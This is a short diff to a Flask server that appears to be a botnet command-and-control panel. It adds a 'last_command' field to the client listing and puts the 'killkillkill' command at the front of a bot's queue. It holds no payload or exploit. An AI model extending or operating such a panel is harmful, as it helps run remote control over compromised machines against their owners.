@@ -47,9 +47,10 @@ def api_clients_list():
         data[bot.id]["IP"] = bot.ip
         data[bot.id]["OS"] = bot.os
         data[bot.id]["last_seen"] = bot.last_seen
+        data[bot.id]["last_command"] = bot.last_command
         data[bot.id]["last_response"] = bot.last_response
         data[bot.id]["set_interval"] = bot.sleep_interval
-        data[bot.id]['cmd_queue'] = g.queue[bot.ip]
+        data[bot.id]["cmd_queue"] = g.queue[bot.ip]
     return json.dumps(data)
 
 @app.route("/api/clients/cmd/<int:id>", methods=["POST"])
@@ -86,7 +87,7 @@ def api_clients_kill(id):
     try:
         bot = Bot.query.filter_by(id=id).one()
     except: return "", 500
-    g.queue[bot.ip].append("killkillkill")
+    g.queue[bot.ip].insert(0, "killkillkill")
     return "", 200
 
 @app.route("/api/clients/delete/<int:id>")
